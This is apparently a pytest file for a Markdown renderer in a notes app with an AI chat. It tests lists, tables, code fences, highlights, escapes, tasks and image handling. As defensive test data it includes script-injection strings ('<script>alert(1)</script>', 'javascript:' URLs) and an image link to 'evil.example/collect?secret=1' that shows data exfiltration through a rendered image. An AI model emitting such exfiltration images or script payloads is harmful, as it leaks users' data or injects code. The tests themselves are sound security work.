import re

import pytest

from app.services.markdown_rendering import markdown_task_lines, render_markdown_to_html, render_note_markdown


def test_ordered_list_continues_across_blank_lines_between_items() -> None:
    rendered = render_markdown_to_html(
        "1. First point\n\n1. Second point\n\n1. Third point\n\nAfter the list."
    )

    assert rendered == (
        "<ol><li>First point</li><li>Second point</li>"
        "<li>Third point</li></ol><p>After the list.</p>"
    )


def test_ordered_list_honors_an_explicit_non_one_start_number() -> None:
    rendered = render_markdown_to_html("4. Fourth point")

    assert rendered == '<ol start="4"><li>Fourth point</li></ol>'


def test_malformed_external_markdown_table_renders_as_text() -> None:
    rendered = render_markdown_to_html(
        "Answer before table.\n\n"
        "| Topic | Detail |\n"
        "| --- |\n"
        "| caching | reused input |"
    )

    assert rendered == (
        "<p>Answer before table.</p>"
        "<p>| Topic | Detail |\n"
        "| --- |\n"
        "| caching | reused input |</p>"
    )


def test_bold_currency_amounts_do_not_become_one_latex_span() -> None:
    rendered = render_markdown_to_html(
        "QQQ is currently **$741.64**, up **$0.43** (**+0.06%**) today."
    )

    assert rendered == (
        "<p>QQQ is currently <strong>$741.64</strong>, up "
        "<strong>$0.43</strong> (<strong>+0.06%</strong>) today.</p>"
    )
    assert "meta-latex" not in rendered


def test_numeric_dollar_delimited_math_still_renders() -> None:
    rendered = render_markdown_to_html("Math: $2 + 3 = 5$.")

    assert 'class="meta-latex meta-latex-inline"' in rendered
    assert "<math" in rendered


def test_plain_currency_range_keeps_both_dollar_signs() -> None:
    rendered = render_markdown_to_html("The range is $5–$10 today.")

    assert rendered == "<p>The range is $5–$10 today.</p>"
    assert "meta-latex" not in rendered


# Fenced code that names a language is coloured as @code=<language> colours it.
_FENCE = "```{language}\n{code}\n```"


def test_a_fence_naming_a_language_is_highlighted_with_its_label() -> None:
    rendered = render_markdown_to_html(_FENCE.format(language="python", code="def f(x):\n    return x < 1"))
    assert rendered.startswith('<div class="meta-code"><span class="meta-code-language">python</span>')
    assert '<span class="tok-k">def</span>' in rendered
    assert '<span class="tok-o">&lt;</span>' in rendered


def test_a_fence_language_may_be_an_alias_in_any_case() -> None:
    for language in ("py", "Python", "JS"):
        rendered = render_markdown_to_html(_FENCE.format(language=language, code="x = 1"))
        assert f'<span class="meta-code-language">{language}</span>' in rendered
        assert 'class="tok-' in rendered


def test_a_fence_without_a_known_language_stays_plain_without_a_badge() -> None:
    assert render_markdown_to_html(_FENCE.format(language="", code="plain <b>")) == "<pre><code>plain &lt;b&gt;</code></pre>"
    assert render_markdown_to_html(_FENCE.format(language="output", code="42")) == (
        '<pre><code class="language-output">42</code></pre>'
    )
    assert "Unknown language" not in render_markdown_to_html(_FENCE.format(language="text", code="x"))


def test_a_mermaid_fence_is_unchanged() -> None:
    assert render_markdown_to_html(_FENCE.format(language="mermaid", code="graph TD\nA-->B")) == (
        '<pre class="meta-mermaid-source"><code class="language-mermaid">graph TD\nA--&gt;B</code></pre>'
    )


def test_highlighted_fence_code_is_escaped() -> None:
    rendered = render_markdown_to_html(_FENCE.format(language="html", code='<script>alert("x")</script>'))
    assert "<script>" not in rendered
    assert "&lt;" in rendered


def test_an_indented_fence_renders_its_code_without_the_indent() -> None:
    # A fence under a list item, as pasted from an AI answer.
    rendered = render_markdown_to_html("1. Point\n\n   ```\n   record = lookup(key)\n     nested\n   ```\n\nAfter.")
    assert "<pre><code>record = lookup(key)\n  nested</code></pre>" in rendered
    assert rendered.endswith("<p>After.</p>")


def test_an_indented_heading_renders_as_a_heading() -> None:
    assert render_markdown_to_html("  ## Title") == "<h2>Title</h2>"


# Tables: line breaks in cells, uneven rows, escaped pipes (docs/ui/content-formatting.md).

_STATE_TABLE_HEAD = "| State | What | Entry |\n|---|---|---|\n"


def _table(body_cells_html: str) -> str:
    return (
        '<div class="meta-markdown-table-wrap"><table><thead><tr>'
        "<th>State</th><th>What</th><th>Entry</th></tr></thead>"
        f"<tbody>{body_cells_html}</tbody></table></div>"
    )


def test_line_break_tag_breaks_the_line_inside_a_table_cell() -> None:
    rendered = render_markdown_to_html(
        _STATE_TABLE_HEAD + "| Install | Run the script<br>then restart | ok |"
    )

    assert rendered == _table(
        "<tr><td>Install</td><td>Run the script<br>then restart</td><td>ok</td></tr>"
    )


def test_every_spelling_of_the_line_break_tag_breaks_the_line() -> None:
    for spelling in ("<br>", "<br/>", "<br />", "<BR>", "<Br />"):
        assert render_markdown_to_html(f"one{spelling}two") == "<p>one<br>two</p>"


def test_line_break_tag_stays_text_in_code() -> None:
    assert render_markdown_to_html("Write `<br>` here") == (
        "<p>Write <code>&lt;br&gt;</code> here</p>"
    )
    assert render_markdown_to_html("```\na<br>b\n```") == "<pre><code>a&lt;br&gt;b</code></pre>"


def test_other_raw_html_tags_stay_escaped() -> None:
    assert render_markdown_to_html("<b>x</b> <script>alert(1)</script>") == (
        "<p>&lt;b&gt;x&lt;/b&gt; &lt;script&gt;alert(1)&lt;/script&gt;</p>"
    )


def test_short_row_gets_empty_cells_and_the_table_goes_on() -> None:
    rendered = render_markdown_to_html(
        _STATE_TABLE_HEAD + "| Fault | Missing a cell |\n| Idle | Waits | Reset |"
    )

    assert rendered == _table(
        "<tr><td>Fault</td><td>Missing a cell</td><td></td></tr>"
        "<tr><td>Idle</td><td>Waits</td><td>Reset</td></tr>"
    )


def test_long_row_keeps_only_the_header_columns() -> None:
    rendered = render_markdown_to_html(_STATE_TABLE_HEAD + "| 1 | 2 | 3 | 4 |")

    assert rendered == _table("<tr><td>1</td><td>2</td><td>3</td></tr>")


def test_escaped_pipe_is_a_pipe_inside_a_cell() -> None:
    rendered = render_markdown_to_html("| a \\| b | c |\n|---|---|\n| `d \\| e` | f |")

    assert rendered == (
        '<div class="meta-markdown-table-wrap"><table><thead><tr>'
        "<th>a | b</th><th>c</th></tr></thead>"
        "<tbody><tr><td><code>d | e</code></td><td>f</td></tr></tbody></table></div>"
    )


def test_bare_pipe_splits_cells_even_inside_a_code_span() -> None:
    rendered = render_markdown_to_html("| a | b |\n|---|---|\n| `x | y` |")

    assert "<td>`x</td><td>y`</td>" in rendered


def test_escaped_trailing_pipe_stays_in_the_last_cell() -> None:
    rendered = render_markdown_to_html("| a | b \\|\n|---|---|")

    assert "<th>a</th><th>b |</th>" in rendered


def note_html(markdown: str) -> str:
    return render_note_markdown(markdown, takes_footnotes=True).html


# Nested lists (2026-10-31): an item two or more columns (or a tab) deeper than its list
# sits inside the item above it.
@pytest.mark.parametrize(("markdown", "expected"), [
    (
        "- a\n  - b\n    1. c\n    2. d\n  - e\n- f",
        "<ul><li>a<ul><li>b<ol><li>c</li><li>d</li></ol></li><li>e</li></ul></li><li>f</li></ul>",
    ),
    ("- a\n\n  - after a blank line\n\n- b", "<ul><li>a<ul><li>after a blank line</li></ul></li><li>b</li></ul>"),
    ("3. three\n   - a bullet\n4. four", '<ol start="3"><li>three<ul><li>a bullet</li></ul></li><li>four</li></ol>'),
    ("- a\n  - b\n    3. c", '<ul><li>a<ul><li>b<ol start="3"><li>c</li></ol></li></ul></li></ul>'),
    ("- a\n\t- tabbed\n\t\t- twice\n- b", "<ul><li>a<ul><li>tabbed<ul><li>twice</li></ul></li></ul></li><li>b</li></ul>"),
    ("- a\n  continued\n- b", "<ul><li>a\ncontinued</li><li>b</li></ul>"),
    # One column deeper is a sibling, as in standard Markdown.
    ("- a\n - b\n- c", "<ul><li>a</li><li>b</li><li>c</li></ul>"),
    ("- a\n  - b\n\nAfter", "<ul><li>a<ul><li>b</li></ul></li></ul><p>After</p>"),
])
def test_an_indented_item_nests_inside_the_item_above(markdown: str, expected: str) -> None:
    assert render_markdown_to_html(markdown) == expected


# Images (2026-10-31): drawn in notes from web addresses only; the AI chat and footnotes
# (render_markdown_to_html) draw none.
@pytest.mark.parametrize(("markdown", "expected"), [
    ("![a cat](https://example.com/cat.png)", '<p><img src="https://example.com/cat.png" alt="a cat" loading="lazy"></p>'),
    ("Look ![c](http://e.com/c.png) here", '<p>Look <img src="http://e.com/c.png" alt="c" loading="lazy"> here</p>'),
    ("- item ![c](https://e.com/c.png)", '<ul><li>item <img src="https://e.com/c.png" alt="c" loading="lazy"></li></ul>'),
    (
        '![a "q" & b](https://e.com/a.png?x=1&y=2)',
        '<p><img src="https://e.com/a.png?x=1&amp;y=2" alt="a &quot;q&quot; &amp; b" loading="lazy"></p>',
    ),
    # No web address: no image to load, so the text stays as written.
    ("![x](photo.png)", "<p>![x](photo.png)</p>"),
    ("![x](javascript:alert(1))", "<p>![x](javascript:alert(1))</p>"),
    ("![x](data:image/png;base64,AAAA)", "<p>![x](data:image/png;base64,AAAA)</p>"),
    # A link, and a ! before other text, are unchanged.
    ("Wow! [link](https://e.com)", '<p>Wow! <a href="https://e.com" target="_blank" rel="noopener noreferrer">link</a></p>'),
])
def test_a_note_draws_web_images(markdown: str, expected: str) -> None:
    assert note_html(markdown) == expected


def test_the_ai_chat_draws_no_images() -> None:
    # An image address in a reply would send data out when the browser loads it.
    rendered = render_markdown_to_html("![x](https://evil.example/collect?secret=1)")
    assert "<img" not in rendered
    assert note_html("> quoted ![x](https://e.com/x.png)").count("<img") == 1


# Tasks (2026-10-31): - [ ] and - [x] in a note are boxes numbered in order through the
# note (quotes and nested lists included); the AI chat draws none.
def test_tasks_are_numbered_boxes_in_a_note() -> None:
    markdown = "Groceries\n- [ ] milk\n- [x] bread\n  - [X] nested\n> - [ ] quoted\n1. [ ] numbered\n- [ ]\n- [link] not a task"
    rendered = note_html(markdown)
    boxes = re.findall(r'role="checkbox" aria-checked="(true|false)" data-task-index="(\d+)"', rendered)
    assert boxes == [("false", "0"), ("true", "1"), ("true", "2"), ("false", "3"), ("false", "4"), ("false", "5")]
    assert "<li>[link] not a task</li>" in rendered
    assert '<ol><li class="meta-markdown-task">' in rendered
    assert markdown_task_lines(markdown) == [1, 2, 3, 4, 5, 6]


def test_a_fenced_task_and_the_ai_chat_draw_no_box() -> None:
    assert markdown_task_lines("```\n- [ ] in code\n```\n- [ ] real") == [3]
    assert "checkbox" not in render_markdown_to_html("- [ ] a reply's task")


# Highlights (2026-10-31): ==text==, as Obsidian writes them; not with spaces inside the
# marks, nor in code.
@pytest.mark.parametrize(("markdown", "expected"), [
    ("A ==highlighted== word", "<p>A <mark>highlighted</mark> word</p>"),
    ("**==bold highlight==**", "<p><strong><mark>bold highlight</mark></strong></p>"),
    ("==**bold** inside==", "<p><mark><strong>bold</strong> inside</mark></p>"),
    ("# ==Heading==", "<h1><mark>Heading</mark></h1>"),
    ("==🔴 urgent==", "<p><mark>🔴 urgent</mark></p>"),
    ("a==b==c", "<p>a<mark>b</mark>c</p>"),
    ("a == b", "<p>a == b</p>"),
    ("x == y == z", "<p>x == y == z</p>"),
    ("====", "<p>====</p>"),
    ("== spaced ==", "<p>== spaced ==</p>"),
    ("`==code==`", "<p><code>==code==</code></p>"),
])
def test_double_equals_highlight(markdown: str, expected: str) -> None:
    assert render_markdown_to_html(markdown) == expected


# Standard Markdown wins (2026-10-31; docs/ui/content-formatting.md, Markdown meta tags):
# CommonMark's paragraphs, line breaks, lists and quotes, in notes and the AI chat alike.
@pytest.mark.parametrize(("markdown", "expected"), [
    # One Return joins the lines; a blank line starts a new paragraph.
    ("one\ntwo\n\nthree", "<p>one\ntwo</p><p>three</p>"),
    # Two spaces or a backslash at a line's end break it; an escaped backslash does not.
    ("a  \nb\\\nc", "<p>a<br>\nb<br>\nc</p>"),
    ("a\\\\\nb", "<p>a\\\nb</p>"),
    # A list item's following lines join it, indented or not.
    ("- a\nlazy\n  indented", "<ul><li>a\nlazy\nindented</li></ul>"),
    # 1) is a numbered list; another delimiter or bullet starts a new list.
    ("1) one\n2) two", "<ol><li>one</li><li>two</li></ol>"),
    ("3) three", '<ol start="3"><li>three</li></ol>'),
    ("1) a\n1. b", "<ol><li>a</li></ol><ol><li>b</li></ol>"),
    ("* a\n- b", "<ul><li>a</li></ul><ul><li>b</li></ul>"),
    # Indented as far as the item's text, after a blank line: the item's own blocks.
    (
        "- Hotel\n\n  Ask for a garden room.\n\n  ```\n  code\n  ```\n- Groceries",
        "<ul><li><p>Hotel</p><p>Ask for a garden room.</p><pre><code>code</code></pre></li><li>Groceries</li></ul>",
    ),
    ("1. One\n\n   Under one\n2. Two", "<ol><li><p>One</p><p>Under one</p></li><li>Two</li></ol>"),
    # Indented less than the item's text: not the item's.
    ("1. One\n\n  Not under one", "<ol><li>One</li></ol><p>Not under one</p>"),
    # A blank line ends a quote; a line holding only > keeps it going; a line without >
    # right after its text goes on with it.
    ("> one\n\n> two", "<blockquote><p>one</p></blockquote><blockquote><p>two</p></blockquote>"),
    ("> a\n>\n> b\nlazy", "<blockquote><p>a</p><p>b\nlazy</p></blockquote>"),
])
def test_standard_markdown_renders_as_the_standard_says(markdown: str, expected: str) -> None:
    assert render_markdown_to_html(markdown) == expected


def test_a_footnotes_lines_join_and_a_bracket_numbered_task_has_its_box() -> None:
    note = render_note_markdown("A[^1]\n\n[^1]: line one\n    line two", takes_footnotes=True)
    assert [body for _token, body in note.footnotes] == ["line one\nline two"]
    assert 'data-task-index="0"' in note_html("1) [ ] task")
    assert markdown_task_lines("1) [ ] a\n2) [x] b") == [0, 1]


# Backslash escapes and underscores inside words, as CommonMark has them (found importing an
# Obsidian vault, 2026-10-31: `snake\_case` showed its backslashes, `a_b_c` italicized b).
@pytest.mark.parametrize(("markdown", "expected"), [
    ("\\*not emphasis\\*", "<p>*not emphasis*</p>"),
    ("1\\. not a list", "<p>1. not a list</p>"),
    ("\\# not a heading", "<p># not a heading</p>"),
    ("snake\\_case", "<p>snake_case</p>"),
    # The address after an escaped [ is a bare one, linked without the unmatched ) (GFM).
    (
        "\\[not a link](https://e.com)",
        '<p>[not a link](<a href="https://e.com" target="_blank" rel="noopener noreferrer">https://e.com</a>)</p>',
    ),
    ("a\\\\b", "<p>a\\b</p>"),
    ("\\a stays", "<p>\\a stays</p>"),
    ("`\\_ in code`", "<p><code>\\_ in code</code></p>"),
    ("\\<br> as text", "<p>&lt;br&gt; as text</p>"),
    ("snake_case_name", "<p>snake_case_name</p>"),
    ("a__b__c", "<p>a__b__c</p>"),
    ("_em_ and __strong__", "<p><em>em</em> and <strong>strong</strong></p>"),
    ("a*b*c", "<p>a<em>b</em>c</p>"),
])
def test_backslash_escapes_and_intraword_underscores(markdown: str, expected: str) -> None:
    assert render_markdown_to_html(markdown) == expected


def test_a_matched_backslash_pair_is_a_formula_not_two_escapes() -> None:
    # MetaList's LaTeX on top of Markdown: \(x\) is a formula; a lone escape still escapes.
    rendered = render_markdown_to_html("\\(x\\) and a\\_b")
    assert rendered.startswith('<p><span class="meta-latex meta-latex-inline" data-latex-source="x">')
    assert rendered.endswith(" and a_b</p>")


# A bare web address leaves a trailing full stop, comma or unmatched ) out of its link (GFM).
@pytest.mark.parametrize(("markdown", "linked", "after"), [
    ("See https://e.com.", "https://e.com", "."),
    ("(see https://e.com)", "https://e.com", ")"),
    ("https://en.wikipedia.org/wiki/Foo_(bar)", "https://en.wikipedia.org/wiki/Foo_(bar)", ""),
    ("Is it https://e.com/a?", "https://e.com/a", "?"),
])
def test_a_bare_address_leaves_trailing_punctuation_out(markdown: str, linked: str, after: str) -> None:
    rendered = render_markdown_to_html(markdown)
    assert f'<a href="{linked}" target="_blank" rel="noopener noreferrer">{linked}</a>{after}' in rendered
